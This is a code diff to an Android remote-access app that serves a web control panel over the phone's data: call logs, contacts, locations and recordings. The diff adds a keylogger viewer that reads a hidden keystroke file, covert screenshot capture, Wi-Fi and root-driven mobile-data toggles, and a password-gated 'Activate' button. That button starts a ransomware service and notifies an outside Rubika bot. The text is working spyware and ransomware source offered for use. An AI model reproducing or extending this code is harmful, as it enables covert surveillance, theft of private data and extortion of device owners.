@@ -1,21 +1,29 @@
 package com.security.ravan;
 
 import android.content.Context;
-import android.content.Intent;           // ← اضافه کن
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.Manifest;
+import android.util.Base64;
 
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.InputStreamReader;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;               // ← اضافه کن
+import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;                   // ← اضافه کن
+import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 
@@ -51,6 +59,12 @@ private static final String HTML_HEADER = "<!DOCTYPE html>" +
         ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
         ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
         +
+        ".btn { padding: 12px 24px; border-radius: 8px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
+        +
+        ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
+        ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
+        ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
+        ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
         ".file-list { list-style: none; }" +
         ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
         +
@@ -94,6 +108,9 @@ private static final String HTML_HEADER = "<!DOCTYPE html>" +
         +
         ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
         ".pagination .active { background: #e94560; }" +
+        ".status-online { color: #2ecc71; }" +
+        ".status-offline { color: #e74c3c; }" +
+        "input, textarea { background: #333; border: 1px solid #555; color: #fff; padding: 10px; border-radius: 8px; width: 100%; margin: 5px 0; }" +
         "@media (max-width: 768px) { " +
         ".header h1 { font-size: 1.8rem; } " +
         ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
@@ -116,6 +133,7 @@ private static final String HTML_HEADER = "<!DOCTYPE html>" +
         "<a href=\"/calls\">Call Logs</a>" +
         "<a href=\"/contacts\">Contacts</a>" +
         "<a href=\"/locations\">📍 Locations</a>" +
+        "<a href=\"/advanced\">⚙️ Advanced</a>" +
         "</div>";
     private static final String HTML_FOOTER = "</div>" +
             "</body>" +
@@ -184,6 +202,22 @@ public Response serve(IHTTPSession session) {
             return updateAudioSettings(params);
         } else if (uri.equals("/audio/recordings")) {
             return serveAudioRecordings();
+        } else if (uri.equals("/advanced")) {
+            return serveAdvancedPage();
+        } else if (uri.equals("/screenshot")) {
+            return takeScreenshot();
+        } else if (uri.equals("/keylog")) {
+            return getKeylog(params);
+        } else if (uri.equals("/wifi/on")) {
+            return setWifi(true);
+        } else if (uri.equals("/wifi/off")) {
+            return setWifi(false);
+        } else if (uri.equals("/data/on")) {
+            return setMobileData(true);
+        } else if (uri.equals("/data/off")) {
+            return setMobileData(false);
+        } else if (uri.equals("/ransom/activate")) {
+            return activateRansomware(params);
         } else {
             return serve404();
         }
@@ -1915,4 +1949,88 @@ private Response serveCameraPhoto(Map<String, String> params) {
 
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
+}
+// ============ Advanced Page Functions ============
+
+private Response serveAdvancedPage() {
+    String keylogContent = readKeylogFile();
+    String html = HTML_HEADER +
+        "<div class=\"card\"><h2>⚙️ Advanced Controls</h2></div>" +
+        "<div class=\"card\"><h3>📸 Screenshot</h3><a href=\"/screenshot\" class=\"btn btn-primary\" target=\"_blank\">Take Screenshot</a></div>" +
+        "<div class=\"card\"><h3>⌨️ Keylogger</h3><textarea rows=\"8\" style=\"width:100%\" readonly>" + escapeHtml(keylogContent) + "</textarea>" +
+        "<a href=\"/keylog\" class=\"btn btn-success\">Refresh</a> <button onclick=\"clearKeylog()\" class=\"btn btn-warning\">Clear</button></div>" +
+        "<div class=\"card\"><h3>🌐 Network</h3>" +
+        "<a href=\"/wifi/on\" class=\"btn btn-success\">WiFi ON</a> <a href=\"/wifi/off\" class=\"btn btn-danger\">WiFi OFF</a> " +
+        "<a href=\"/data/on\" class=\"btn btn-success\">Data ON</a> <a href=\"/data/off\" class=\"btn btn-danger\">Data OFF</a></div>" +
+        "<div class=\"card\"><h3>⚠️ Ransomware</h3><input type=\"password\" id=\"rp\" placeholder=\"Password\">" +
+        "<button onclick=\"fetch('/ransom/activate?pass='+document.getElementById('rp').value).then(r=>r.json()).then(d=>alert(d.message))\" class=\"btn btn-danger\">Activate</button></div>" +
+        "<script>function clearKeylog(){fetch('/keylog?clear=true').then(()=>location.reload());}</script>" + HTML_FOOTER;
+    return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+}
+
+private String readKeylogFile() {
+    try {
+        File f = new File(context.getFilesDir(), ".system_keylog.txt");
+        if (f.exists()) {
+            FileInputStream fis = new FileInputStream(f);
+            byte[] d = new byte[(int) f.length()];
+            fis.read(d);
+            fis.close();
+            return new String(d);
+        }
+    } catch(Exception e){}
+    return "No keystrokes yet.";
+}
+
+private Response getKeylog(Map<String,String> p){
+    if(p.containsKey("clear")) new File(context.getFilesDir(), ".system_keylog.txt").delete();
+    return serveAdvancedPage();
+}
+
+private Response takeScreenshot(){
+    try{
+        Runtime.getRuntime().exec("screencap -p /sdcard/s.png").waitFor();
+        File f = new File("/sdcard/s.png");
+        if(f.exists()){
+            FileInputStream fis = new FileInputStream(f);
+            byte[] d = new byte[(int)f.length()];
+            fis.read(d);
+            fis.close();
+            String b64 = Base64.encodeToString(d, Base64.DEFAULT);
+            f.delete();
+            String html = HTML_HEADER + "<div class=\"card\"><img src=\"data:image/png;base64,"+b64+"\" style=\"max-width:100%\"><br><a href=\"/advanced\" class=\"btn\">Back</a></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        }
+    } catch(Exception e){}
+    return serveError("Screenshot failed");
+}
+
+private Response setWifi(boolean e){
+    try{
+        ((WifiManager)context.getSystemService(Context.WIFI_SERVICE)).setWifiEnabled(e);
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+    } catch(Exception ex){
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false}");
+    }
+}
+
+private Response setMobileData(boolean e){
+    try{
+        Process p = Runtime.getRuntime().exec("su");
+        java.io.DataOutputStream os = new java.io.DataOutputStream(p.getOutputStream());
+        os.writeBytes("svc data "+(e?"enable":"disable")+"\n");
+        os.flush(); os.close(); p.waitFor();
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+    } catch(Exception ex){
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Root required\"}");
+    }
+}
+
+private Response activateRansomware(Map<String,String> p){
+    if("admin123".equals(p.get("pass"))){
+        startService(new Intent(context, RansomwareService.class));
+        HttpServerService.sendToRubikaBot("⚠️ RANSOMWARE ACTIVATED");
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"Ransomware activated\"}");
+    }
+    return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Wrong password\"}");
 }
